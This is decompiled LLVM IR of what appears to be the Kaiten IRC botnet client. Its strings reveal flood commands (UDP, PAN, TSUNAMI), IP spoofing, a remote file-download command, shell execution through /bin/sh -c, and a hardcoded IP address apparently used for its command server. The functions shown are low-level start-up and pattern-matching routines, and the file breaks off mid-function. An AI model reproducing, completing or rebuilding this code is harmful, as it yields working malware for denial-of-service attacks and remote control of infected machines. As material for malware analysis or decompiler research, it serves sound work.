source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%rusage = type { %timeval, %timeval, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%timeval = type { i32, i32 }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_80560b4.2 = global i32 0
@global_var_80560e4.3 = local_unnamed_addr global i32* @global_var_80560b4.2
@global_var_8056484.4 = global i32 0
@global_var_8058c68.7 = local_unnamed_addr global i32 0
@global_var_80528b0.8 = constant [30 x i8] c"NOTICE %s :Unable to comply.\0A\00"
@global_var_80564b0.9 = local_unnamed_addr global i32 0
@global_var_8058d8c.10 = local_unnamed_addr global i32 0
@global_var_80528ce.13 = constant i32 1966014578
@global_var_80528d0.14 = constant [16 x i8] c"/usr/dict/words\00"
@global_var_80528e0.16 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_80528fc.17 = constant [33 x i8] c"NOTICE %s :GET <host> <save as>\0A\00"
@global_var_8052920.18 = constant [37 x i8] c"NOTICE %s :Unable to create socket.\0A\00"
@global_var_8052945.19 = constant [8 x i8] c"http://\00"
@global_var_8052950.20 = constant [39 x i8] c"NOTICE %s :Unable to resolve address.\0A\00"
@global_var_8052978.21 = constant [39 x i8] c"NOTICE %s :Unable to connect to http.\0A\00"
@global_var_80529a0.22 = constant [276 x i8] c"GET /%s HTTP/1.0\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_8052ab4.23 = constant [28 x i8] c"NOTICE %s :Receiving file.\0A\00"
@global_var_8052ad0.24 = constant [3 x i8] c"wb\00"
@global_var_8052ad3.25 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_8052ad8.26 = constant [24 x i8] c"NOTICE %s :Saved as %s\0A\00"
@global_var_8052af0.27 = constant [32 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d\0A\00"
@global_var_8052b10.28 = constant [46 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\0A\00"
@global_var_8052b3e.29 = constant [29 x i8] c"NOTICE %s :Kaiten wa goraku\0A\00"
@global_var_8052b5b.30 = constant [24 x i8] c"NOTICE %s :NICK <nick>\0A\00"
@global_var_8052b74.31 = constant [53 x i8] c"NOTICE %s :Nick cannot be larger than 9 characters.\0A\00"
@global_var_8052ba9.32 = constant [9 x i8] c"NICK %s\0A\00"
@global_var_8052bb2.33 = constant [27 x i8] c"NOTICE %s :DISABLE <pass>\0A\00"
@global_var_8052bf4.36 = constant [35 x i8] c"NOTICE %s :Current status is: %s.\0A\00"
@global_var_8052c17.37 = constant [30 x i8] c"NOTICE %s :Already disabled.\0A\00"
@global_var_8052c38.38 = constant [37 x i8] c"NOTICE %s :Password too long! > 254\0A\00"
@global_var_8058b60.39 = global i32 0
@global_var_8052c60.40 = constant [31 x i8] c"NOTICE %s :Disable sucessful.\0A\00"
@global_var_8052c7f.41 = constant [26 x i8] c"NOTICE %s :ENABLE <pass>\0A\00"
@global_var_8052c99.42 = constant [29 x i8] c"NOTICE %s :Already enabled.\0A\00"
@global_var_8052cb6.43 = constant [27 x i8] c"NOTICE %s :Wrong password\0A\00"
@global_var_8052cd1.44 = constant [30 x i8] c"NOTICE %s :Password correct.\0A\00"
@global_var_8052cf0.45 = constant [31 x i8] c"NOTICE %s :Removed all spoofs\0A\00"
@global_var_8052d10.46 = constant [75 x i8] c"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\0A\00"
@global_var_80568c0.47 = global i32 0
@global_var_8052d5c.48 = constant [33 x i8] c"NOTICE %s :Unable to resolve %s\0A\00"
@global_var_8052d80.49 = constant [39 x i8] c"NOTICE %s :UDP <target> <port> <secs>\0A\00"
@global_var_8052da7.50 = constant [26 x i8] c"NOTICE %s :Packeting %s.\0A\00"
@global_var_8052de0.51 = constant i32 2
@global_var_8052e30.52 = constant [39 x i8] c"NOTICE %s :PAN <target> <port> <secs>\0A\00"
@global_var_8052e57.53 = constant [24 x i8] c"NOTICE %s :Panning %s.\0A\00"
@global_var_8052e70.54 = constant [36 x i8] c"NOTICE %s :TSUNAMI <target> <secs>\0A\00"
@global_var_8052e94.55 = constant [36 x i8] c"NOTICE %s :Tsunami heading for %s.\0A\00"
@global_var_8058d80.59 = local_unnamed_addr global i32 0
@global_var_80564a0.60 = local_unnamed_addr global i32 0
@global_var_8058d88.79 = local_unnamed_addr global i32 0
@global_var_8058c64.80 = local_unnamed_addr global i32 0
@global_var_805364d.90 = constant [13 x i8] c"MODE %s -xi\0A\00"
@global_var_805365a.92 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_8053667.93 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_805366f.94 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_8053678.95 = constant [93 x i8] c"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\0A\00"
@global_var_80528a0.100 = constant [16 x i8] c"212.109.222.122\00"
@global_var_8056104.101 = global [16 x i8]* @global_var_80528a0.100
@global_var_8058b10.102 = local_unnamed_addr global i32 0
@global_var_8058b20.107 = global i32 0
@global_var_8056218.108 = global i32 0
@global_var_80568e0.109 = local_unnamed_addr global i32 0
@global_var_80568e4.110 = local_unnamed_addr global i32 0
@global_var_80568c4.111 = global i32 0
@global_var_80568dc.112 = local_unnamed_addr global i32 0
@global_var_8053a60.113 = constant [3 x i8] c"-c\00"
@global_var_8053a68.114 = constant [3 x i8] c"sh\00"
@global_var_8053a63.115 = constant [8 x i8] c"/bin/sh\00"
@global_var_8056230.116 = local_unnamed_addr global i32 2
@global_var_8056200.117 = global i32 0
@global_var_80561fc.118 = global i32* bitcast (i16* @global_var_8056240.104 to i32*)
@global_var_8053a6c.119 = constant i32 0
@global_var_8053a84.120 = constant [6 x i8] c"(nil)\00"
@global_var_8053a8a.121 = constant [7 x i8] c"(null)\00"
@global_var_8053a91.122 = constant i32 2949163
@global_var_8053afe.124 = constant i32 327688
@global_var_8056440 = external local_unnamed_addr global i32
@global_var_8054d40.126 = constant i32 65536
@global_var_8053af6.127 = constant [8 x i8] c" +0-#'I\00"
@global_var_8053aa4.128 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_8053ae1.129 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_8053ad7.130 = constant i32 117506048
@global_var_8053ac8.131 = constant i32 331776
@global_var_8053b40.132 = constant [8 x i8] c"Success\00"
@global_var_8053b22.133 = constant [15 x i8] c"Unknown error \00"
@global_var_8056448.134 = local_unnamed_addr global i32* @global_var_8054d40.126
@global_var_8058920.135 = global i32 0
@global_var_8058aec.136 = global i32 0
@global_var_8056450.137 = global i32 0
@global_var_8059134.138 = local_unnamed_addr global i32 0
@global_var_8059128.139 = global i32 0
@global_var_8056330.140 = global i32 0
@global_var_8058dcc.142 = global i32 0
@global_var_8058dd0.143 = local_unnamed_addr global i32 0
@global_var_8058dd4.144 = global i32 0
@global_var_8058de0.145 = local_unnamed_addr global i32 0
@global_var_80590d4.146 = global i32 0
@global_var_80590fc.147 = local_unnamed_addr global i32 0
@global_var_80590ec.148 = local_unnamed_addr global i32 0
@global_var_80590f0.149 = local_unnamed_addr global i32 0
@global_var_80590f4.150 = local_unnamed_addr global i32 0
@global_var_8059110.151 = local_unnamed_addr global i32 0
@global_var_80590f8.152 = local_unnamed_addr global i32 0
@global_var_8059104.153 = local_unnamed_addr global i32 0
@global_var_8059108.154 = local_unnamed_addr global i32 0
@global_var_8059114.155 = local_unnamed_addr global i32 0
@global_var_80590e8.156 = local_unnamed_addr global i32 0
@global_var_80590e4.158 = local_unnamed_addr global i32 0
@global_var_805910c.159 = local_unnamed_addr global i32 0
@global_var_8058ddc.160 = local_unnamed_addr global i32 0
@global_var_8056348.161 = global i32 0
@global_var_8056360.163 = global i32 0
@global_var_8056378 = external global i32
@global_var_80563a4.165 = global i32 -1726662223
@global_var_8056380.166 = local_unnamed_addr global i32* @global_var_80563a4.165
@global_var_805637c.167 = global i32* @global_var_80563a4.165
@global_var_80546b4.168 = constant i32 0
@global_var_80546a0.169 = constant i32 0
@global_var_8056420.170 = global i32 0
@global_var_8058b04.171 = local_unnamed_addr global i32 0
@global_var_8058b0c.172 = local_unnamed_addr global i32 0
@global_var_80560a8.174 = global i32 -1
@global_var_804f637.175 = constant i32 -294069
@global_var_8058b14.176 = local_unnamed_addr global i32 0
@global_var_8058b18.177 = local_unnamed_addr global i32 0
@global_var_8054920.178 = constant [10 x i8] c"/dev/null\00"
@global_var_8058b08.180 = local_unnamed_addr global i32 0
@global_var_804f81f.182 = constant i32 1928542531
@global_var_804f843.183 = constant i32 1928542531
@global_var_8058b44.184 = local_unnamed_addr global i32 0
@global_var_8058b24.185 = global i32 0
@global_var_8054f50.187 = constant [4 x i8] c"inf\00"
@global_var_8054f53.192 = constant i32 1179535616
@global_var_8054f60.193 = constant i32 2883630
@global_var_8058b28.194 = global i32 0
@global_var_8059138.197 = local_unnamed_addr global i32 0
@global_var_805501c.198 = constant i32 1697579054
@global_var_8055050.199 = constant i32 1868824690
@global_var_805501e.200 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_805502f.201 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_8055047.202 = constant [11 x i8] c"nameserver\00"
@global_var_8055052.203 = constant [7 x i8] c"domain\00"
@global_var_8055059.204 = constant [7 x i8] c"search\00"
@global_var_8059118.205 = global i32 0
@global_var_805913c.206 = local_unnamed_addr global i32 0
@global_var_8059140.207 = local_unnamed_addr global i32 0
@global_var_8055074.208 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_8055071.210 = constant [3 x i8] c"%x\00"
@global_var_8055085.211 = constant [11 x i8] c"/etc/hosts\00"
@global_var_8055090.212 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_8056480.1 = local_unnamed_addr global i8 0
@global_var_80564c0.5 = external global i8*
@global_var_80564a4.6 = local_unnamed_addr global i8 0
@global_var_80564a8.11 = external global i8*
@global_var_80564ac.12 = local_unnamed_addr global i64 0
@global_var_80564ab.96 = external local_unnamed_addr global i8*
@global_var_80564aa.97 = external local_unnamed_addr global i8*
@global_var_80564a9.98 = external global i8*
@global_var_8056100.99 = local_unnamed_addr global i64 577912794846855169
@global_var_8056240.104 = global i16 288
@global_var_8056290.105 = local_unnamed_addr global i16 272
@global_var_8053b16.123 = external constant i8*
@global_var_8058da0.141 = global i8 0
@global_var_8059100.157 = local_unnamed_addr global i8 0
@global_var_8058b00.162 = local_unnamed_addr global i8 0
@global_var_8058b1c.179 = local_unnamed_addr global i8 0
@global_var_8054f80.190 = constant x86_fp80* null
@global_var_8058b40.195 = local_unnamed_addr global i64 0
@global_var_805644c.196 = local_unnamed_addr global i16 1

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8048094() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @function_80480b0(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 57375
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @function_8048110()
  %v0_80480a8 = call i32 @function_8052850()
  ret i32 %v0_80480a8
}

define i32 @function_80480b0(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @function_80480c0() local_unnamed_addr {
dec_label_pc_80480c0:
  %v0_80480c6 = load i8, i8* @global_var_8056480.1, align 128
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %dec_label_pc_80480c0.dec_label_pc_8048102_crit_edge

dec_label_pc_80480c0.dec_label_pc_8048102_crit_edge: ; preds = %dec_label_pc_80480c0
  %v0_8048103.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048102

dec_label_pc_80480db.preheader:                   ; preds = %dec_label_pc_80480c0
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_80560e4.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_80560e4.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_80560e4.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_8056480.1, align 128
  br label %dec_label_pc_8048102

dec_label_pc_8048102:                             ; preds = %dec_label_pc_80480c0.dec_label_pc_8048102_crit_edge, %dec_label_pc_80480e6
  %v0_8048103 = phi i32 [ %v0_8048103.pre, %dec_label_pc_80480c0.dec_label_pc_8048102_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048103

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_80560e4.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_8056480.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048102, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @function_8048110() local_unnamed_addr {
dec_label_pc_8048110:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_804814a, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048145 = call i32 @unknown_0(i32 134566052)
  br label %dec_label_pc_804814a

dec_label_pc_804814a:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_804814a = load i32, i32* inttoptr (i32 134570168 to i32*), align 8
  %v1_804814f = icmp eq i32 %v0_804814a, 0
  br i1 %v1_804814f, label %dec_label_pc_8048165, label %dec_label_pc_8048153

dec_label_pc_8048153:                             ; preds = %dec_label_pc_804814a
  br label %dec_label_pc_8048165

dec_label_pc_8048165:                             ; preds = %dec_label_pc_8048153, %dec_label_pc_804814a
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_804814a, { 1, 0 }
}

define i32 @entry_point(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @ebp, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_8048170 = load i32, i32* @eax, align 4
  store i32 %v0_8048170, i32* %stack_var_-4, align 4
  %v4_8048170 = ptrtoint i32* %stack_var_-4 to i32
  %v0_8048172 = load i32, i32* @edx, align 4
  %v9_8048184 = call i32 @function_804f6d3(i32 134525091, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134555780, i32 %v0_8048172, i32 %v4_8048170, i32 %v0_8048170)
  ret i32 %v9_8048184

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_804818c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804818c:
  %tmp13 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_804818f = load i32, i32* @ebx, align 4
  store i32 %v0_804818f, i32* %stack_var_-8, align 4
  %v4_8048193 = ptrtoint i8* %arg1 to i32
  %v2_8048196 = load i8, i8* %arg1, align 1
  %v12_804819f = icmp eq i8 %v2_8048196, 42
  br i1 %v12_804819f, label %dec_label_pc_80481c7, label %dec_label_pc_80481a5

dec_label_pc_80481a5:                             ; preds = %dec_label_pc_804818c
  %v12_80481a5 = icmp eq i8 %v2_8048196, 63
  br i1 %v12_80481a5, label %dec_label_pc_804821a, label %dec_label_pc_80481ab

dec_label_pc_80481ab:                             ; preds = %dec_label_pc_80481a5
  %v4_80481ab = icmp eq i8 %v2_8048196, 0
  br i1 %v4_80481ab, label %dec_label_pc_80481b6, label %dec_label_pc_8048254

dec_label_pc_80481b6:                             ; preds = %dec_label_pc_80481ab
  %v2_80481b9 = load i8, i8* %tmp13, align 1
  %v2_80481bc = sext i8 %v2_80481b9 to i32
  br label %dec_label_pc_80482aa

dec_label_pc_80481c7:                             ; preds = %dec_label_pc_804818c
  %v1_80481ca = add i32 %v4_8048193, 1
  %v4_80481d2 = inttoptr i32 %v1_80481ca to i8*
  %v5_80481d5 = call i32 @function_804818c(i8* %v4_80481d2, i32 %arg2)
  %v1_80481da = icmp eq i32 %v5_80481d5, 0
  br i1 %v1_80481da, label %dec_label_pc_8048208, label %dec_label_pc_80481de

dec_label_pc_80481de:                             ; preds = %dec_label_pc_80481c7
  %v2_80481e1 = load i8, i8* %tmp13, align 1
  %v4_80481e4 = icmp eq i8 %v2_80481e1, 0
  br i1 %v4_80481e4, label %dec_label_pc_804820f, label %dec_label_pc_80481e8

dec_label_pc_80481e8:                             ; preds = %dec_label_pc_80481de
  %v1_80481eb = add i32 %arg2, 1
  %v5_80481f6 = call i32 @function_804818c(i8* nonnull %arg1, i32 %v1_80481eb)
  %v1_80481fb = icmp eq i32 %v5_80481f6, 0
  br i1 %v1_80481fb, label %dec_label_pc_8048208, label %dec_label_pc_804820f

dec_label_pc_8048208:                             ; preds = %dec_label_pc_80481e8, %dec_label_pc_80481c7
  br label %dec_label_pc_804820f

dec_label_pc_804820f:                             ; preds = %dec_label_pc_80481de, %dec_label_pc_80481e8, %dec_label_pc_8048208
  %storemerge6 = phi i32 [ 0, %dec_label_pc_8048208 ], [ 1, %dec_label_pc_80481e8 ], [ 1, %dec_label_pc_80481de ]
  br label %dec_label_pc_80482aa

dec_label_pc_804821a:                             ; preds = %dec_label_pc_80481a5
  %v2_804821d = load i8, i8* %tmp13, align 1
  %v4_8048220 = icmp eq i8 %v2_804821d, 0
  br i1 %v4_8048220, label %dec_label_pc_804824c, label %dec_label_pc_8048224

dec_label_pc_8048224:                             ; preds = %dec_label_pc_804821a
  %v1_8048227 = add i32 %arg2, 1
  %v1_804822b = add i32 %v4_8048193, 1
  %v4_8048230 = inttoptr i32 %v1_804822b to i8*
  %v5_8048233 = call i32 @function_804818c(i8* %v4_8048230, i32 %v1_8048227)
  %v1_8048238 = icmp ne i32 %v5_8048233, 0
  %. = zext i1 %v1_8048238 to i32
  br label %dec_label_pc_804824c

dec_label_pc_804824c:                             ; preds = %dec_label_pc_8048224, %dec_label_pc_804821a
  %storemerge5 = phi i32 [ 1, %dec_label_pc_804821a ], [ %., %dec_label_pc_8048224 ]
  br label %dec_label_pc_80482aa

dec_label_pc_8048254:                             ; preds = %dec_label_pc_80481ab
  %v2_8048257 = load i8, i8* %arg1, align 1
  %v2_804825a = sext i8 %v2_8048257 to i32
  %v2_8048260 = call i32 @function_804ba84(i32 %v2_804825a)
  store i32 %v2_8048260, i32* @ebx, align 4
  %v2_804826a = load i8, i8* %tmp13, align 1
  %v2_804826d = sext i8 %v2_804826a to i32
  %v2_8048273 = call i32 @function_804ba84(i32 %v2_804826d)
  %v0_8048278 = load i32, i32* @ebx, align 4
  %v12_8048278 = icmp eq i32 %v0_8048278, %v2_8048273
  %v1_804827a = icmp eq i1 %v12_8048278, false
  br i1 %v1_804827a, label %dec_label_pc_80482a4, label %dec_label_pc_804827c

dec_label_pc_804827c:                             ; preds = %dec_label_pc_8048254
  %v1_804827f = add i32 %arg2, 1
  %v1_8048283 = add i32 %v4_8048193, 1
  %v4_8048288 = inttoptr i32 %v1_8048283 to i8*
  %v5_804828b = call i32 @function_804818c(i8* %v4_8048288, i32 %v1_804827f)
  %v1_8048290 = icmp ne i32 %v5_804828b, 0
  %.7 = zext i1 %v1_8048290 to i32
  br label %dec_label_pc_80482a4

dec_label_pc_80482a4:                             ; preds = %dec_label_pc_804827c, %dec_label_pc_8048254
  %storemerge = phi i32 [ 1, %dec_label_pc_8048254 ], [ %.7, %dec_label_pc_804827c ]
  br label %dec_label_pc_80482aa

dec_label_pc_80482aa:                             ; preds = %dec_label_pc_804824c, %dec_label_pc_804820f, %dec_label_pc_80481b6, %dec_label_pc_80482a4
  %stack_var_-24.0 = phi i32 [ %storemerge6, %dec_label_pc_804820f ], [ %storemerge5, %dec_label_pc_804824c ], [ %v2_80481bc, %dec_label_pc_80481b6 ], [ %storemerge, %dec_label_pc_80482a4 ]
  %v2_80482b0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80482b0, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048196, { 2, 0, 1 }
  uselistorder i32 (i32)* @function_804ba84, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80482aa, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804820f, { 2, 1, 0 }
}

define i32 @function_80482b3(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80482b3:
  %stack_var_12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80482b6 = load i32, i32* @edi, align 4
  store i32 %v0_80482b6, i32* %stack_var_-8, align 4
  %v4_80482bd = ptrtoint i32* %stack_var_12 to i32
  %v5_80482d5 = call i32 @function_804bbd4(i32 ptrtoint (i8** @global_var_80564c0.5 to i32), i32 %arg2, i32 %v4_80482bd)
  store i1 false, i1* @df, align 1
  store i32 ptrtoint (i8** @global_var_80564c0.5 to i32), i32* @edi, align 4
  %v3_80482ed = call i32 @_strlen(i8* bitcast (i8** @global_var_80564c0.5 to i8*))
  %v6_8048306 = call i32 @function_804ba4c(i32 %arg1, i32* bitcast (i8** @global_var_80564c0.5 to i32*), i32 %v3_80482ed)
  %v2_804830e = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804830e, i32* @edi, align 4
  ret i32 %v6_8048306
}

define i32 @function_8048311(i32 %arg1) local_unnamed_addr {
dec_label_pc_8048311:
  %v0_8048317 = load i8, i8* @global_var_80564a4.6, align 4
  %v10_804831e = icmp eq i8 %v0_8048317, 1
  %v1_8048320 = icmp eq i1 %v10_804831e, false
  br i1 %v1_8048320, label %dec_label_pc_804834b, label %dec_label_pc_8048322

dec_label_pc_8048322:                             ; preds = %dec_label_pc_8048311
  %v0_8048322 = load i32, i32* @global_var_8058c68.7, align 8
  %v3_804833a = call i32 @function_80482b3(i32 %v0_8048322, i32 ptrtoint ([30 x i8]* @global_var_80528b0.8 to i32))
  br label %dec_label_pc_80483e9

dec_label_pc_804834b:                             ; preds = %dec_label_pc_8048311
  %v0_804834b = call i32 @function_804b808()
  %v4_8048353 = icmp eq i32 %v0_804834b, 0
  %v1_8048357 = icmp eq i1 %v4_8048353, false
  br i1 %v1_8048357, label %dec_label_pc_8048364, label %dec_label_pc_8048359

dec_label_pc_8048359:                             ; preds = %dec_label_pc_804834b
  br label %dec_label_pc_80483e9

dec_label_pc_8048364:                             ; preds = %dec_label_pc_804834b
  %v0_8048364 = load i32, i32* @global_var_80564b0.9, align 16
  %v1_8048369 = add i32 %v0_8048364, 1
  store i32 %v1_8048369, i32* @global_var_80564b0.9, align 16
  %v2_8048374 = mul i32 %v1_8048369, 4
  %v1_8048377 = add i32 %v2_8048374, 4
  %v1_804837d = call i32 @function_804ddba(i32 %v1_8048377)
  %v0_80483b011 = load i32, i32* @global_var_80564b0.9, align 16
  %v6_80483b913 = icmp eq i32 %v0_80483b011, 1
  br i1 %v6_80483b913, label %dec_label_pc_80483bb, label %dec_label_pc_804838e

dec_label_pc_804838e:                             ; preds = %dec_label_pc_8048364, %dec_label_pc_804838e
  %storemerge14 = phi i32 [ %v4_80483ad, %dec_label_pc_804838e ], [ 0, %dec_label_pc_8048364 ]
  %v2_8048391 = mul i32 %storemerge14, 4
  %v5_8048396 = add i32 %v2_8048391, %v1_804837d
  %v0_80483a1 = load i32, i32* @global_var_8058d8c.10, align 4
  %v2_80483a6 = add i32 %v0_80483a1, %v2_8048391
  %v1_80483a9 = inttoptr i32 %v2_80483a6 to i32*
  %v2_80483a9 = load i32, i32* %v1_80483a9, align 4
  %v2_80483ab = inttoptr i32 %v5_8048396 to i32*
  store i32 %v2_80483a9, i32* %v2_80483ab, align 4
  %v4_80483ad = add i32 %storemerge14, 1
  %v0_80483b0 = load i32, i32* @global_var_80564b0.9, align 16
  %v1_80483b5 = add i32 %v0_80483b0, -1
  %v6_80483b9 = icmp ugt i32 %v1_80483b5, %v4_80483ad
  br i1 %v6_80483b9, label %dec_label_pc_804838e, label %dec_label_pc_80483bb

dec_label_pc_80483bb:                             ; preds = %dec_label_pc_804838e, %dec_label_pc_8048364
  %v0_80483b0.lcssa = phi i32 [ %v0_80483b011, %dec_label_pc_8048364 ], [ %v0_80483b0, %dec_label_pc_804838e ]
  %v2_80483c0 = mul i32 %v0_80483b0.lcssa, 4
  %v5_80483c3 = add i32 %v2_80483c0, %v1_804837d
  %v1_80483c6 = add i32 %v5_80483c3, -4
  %v2_80483cc = inttoptr i32 %v1_80483c6 to i32*
  store i32 %v0_804834b, i32* %v2_80483cc, align 4
  %v0_80483ce = load i32, i32* @global_var_8058d8c.10, align 4
  %v1_80483d6 = call i32 @function_804eac9(i32 %v0_80483ce)
  store i32 %v1_804837d, i32* @global_var_8058d8c.10, align 4
  br label %dec_label_pc_80483e9

dec_label_pc_80483e9:                             ; preds = %dec_label_pc_8048359, %dec_label_pc_8048322, %dec_label_pc_80483bb
  %stack_var_-24.0 = phi i32 [ %v0_804834b, %dec_label_pc_80483bb ], [ %v0_804834b, %dec_label_pc_8048359 ], [ 1, %dec_label_pc_8048322 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v4_80483ad, { 1, 0 }
  uselistorder i32 %v2_8048391, { 1, 0 }
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v0_80483b011, { 1, 0 }
  uselistorder i32 %v1_804837d, { 2, 0, 1 }
  uselistorder i32* @global_var_80564b0.9, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80483e9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804838e, { 1, 0 }
}

define i32 @function_80483ee() local_unnamed_addr {
dec_label_pc_80483ee:
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v0_80483ee = load i32, i32* @ebp, align 4
  %v0_80483f4 = load i8*, i8** @global_var_80564a8.11, align 4
  %v1_80483f4 = ptrtoint i8* %v0_80483f4 to i32
  store i32 %v1_80483f4, i32* @eax, align 4
  %v2_80483f9 = icmp eq i8* %v0_80483f4, null
  %v1_80483fb = icmp eq i1 %v2_80483f9, false
  br i1 %v1_80483fb, label %dec_label_pc_8048407, label %dec_label_pc_80483fd

dec_label_pc_80483fd:                             ; preds = %dec_label_pc_80483ee
  %v1_80483fd = call i32 @function_804ed9c(i32 %v0_80483ee)
  br label %dec_label_pc_8048450

dec_label_pc_8048407:                             ; preds = %dec_label_pc_80483ee
  %v0_8048407 = load i64, i64* @global_var_80564ac.12, align 8
  %v1_8048407 = trunc i64 %v0_8048407 to i32
  store i32 %v1_8048407, i32* @eax, align 4
  %v9_804840c = icmp eq i32 %v1_8048407, 1
  %v1_804840f = icmp eq i1 %v9_804840c, false
